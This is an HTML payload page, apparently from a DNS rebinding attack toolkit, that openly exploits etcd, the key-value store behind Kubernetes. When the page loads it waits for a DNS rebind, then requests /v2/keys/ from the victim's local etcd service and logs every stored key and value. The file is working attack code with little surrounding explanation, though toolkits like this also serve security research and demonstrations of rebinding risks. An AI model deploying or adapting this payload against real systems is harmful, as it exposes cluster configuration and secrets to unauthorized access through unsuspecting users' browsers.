<!--
This payload is exploiting etcd (https://github.com/coreos/etcd), a key-value store used in Kubernetes for storing all cluster data.
The exploit performs one GET request (http://localhost:2379/v2/keys/) to retrieve all keys and displays them.
The default API port for etcd is TCP 2379 (localhost:2379).
-->
<!doctype html>
<html>

<head>
	<title>etcd Payload</title>
	<script src="payload.js"></script>
	<script>
		function attack(headers, cookie, body) {
			/* /v2/keys/ : Send a GET request to get the list of keys and values */
			fetch('/v2/keys/', {})
				.then(responseOKOrFail("Could not submit a request to get a list of keys"))
				.then(function (d) { // we successfully received data (the key/value pairs)
					console.log(`raw json:  ${d}`);
					let data = JSON.parse(d); // parse JSON server response
					let nodes = data.node.nodes; // get the nodes array with the key / value pairs
					console.log(`Number of keys: ${nodes.length}`);
					let result = '\n';
					for (var i = 0; i < nodes.length; i++) {
						console.log(`key:  ${nodes[i].key}, value: ${nodes[i].value}`);
						result = `${result}key: ${nodes[i].key}, value: ${nodes[i].value}\n`
					}
					console.log(`Your keys and values: ${result}`);
				})
		}
	</script>
</head>

<body onload="begin('/v2/keys/')" )>
	<h3>etcd Payload</h3>
	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
</body>

</html>